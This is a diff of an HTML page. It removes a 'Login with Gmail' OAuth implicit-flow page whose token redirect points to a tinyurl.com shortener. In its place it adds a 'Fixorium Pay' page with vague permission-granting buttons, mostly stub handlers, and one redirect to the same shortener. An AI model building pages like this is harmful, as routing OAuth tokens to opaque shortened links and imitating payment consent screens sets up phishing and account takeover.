@@ -3,50 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login with Gmail</title>
+    <title>Fixorium Pay</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
         }
-        .login-container {
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
             background: white;
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
         button {
-            background-color: #4285F4;
+            background-color: #4CAF50;
             color: white;
+            padding: 10px 15px;
             border: none;
-            padding: 10px 20px;
             border-radius: 5px;
             cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
         }
         button:hover {
-            background-color: #357ae8;
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Login with Gmail</h2>
-        <button id="loginBtn">Login with Google</button>
+    <header>
+        <h1>Fixorium Pay</h1>
+        <h2>Digital Transaction</h2>
+        <img src="https://via.placeholder.com/150" alt="Bank Shape" />
+    </header>
+    <div class="container">
+        <button onclick="loginWithGmail()">Login with Gmail</button>
+        <button onclick="accessAccount()">Access Account</button>
+        <button onclick="acceptRequest()">Accept Request</button>
+        <button onclick="permissionAllow()">Permission Allow</button>
+        <button onclick="confirmAction()">Confirm Action</button>
+        <button onclick="getConfirmation()">Get Confirmation</button>
     </div>
-
     <script>
-        document.getElementById('loginBtn').onclick = function() {
-            const CLIENT_ID = 'YOUR_CLIENT_ID.apps.googleusercontent.com';
-            const REDIRECT_URI = 'http://tinyurl.com/index#';
-            const SCOPE = 'https://www.googleapis.com/auth/userinfo.email';
-            const AUTH_URL = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=token&scope=${SCOPE}`;
-
-            window.location.href = AUTH_URL;
-        };
+        function loginWithGmail() {
+            // Logic for Gmail login
+        }
+        function accessAccount() {
+            // Logic to access account
+        }
+        function acceptRequest() {
+            // Logic to accept request
+        }
+        function permissionAllow() {
+            // Logic to allow permission
+        }
+        function confirmAction() {
+            // Logic to confirm action
+        }
+        function getConfirmation() {
+            window.location.href = "https://tinyurl.com/index#";
+        }
     </script>
 </body>
 </html>
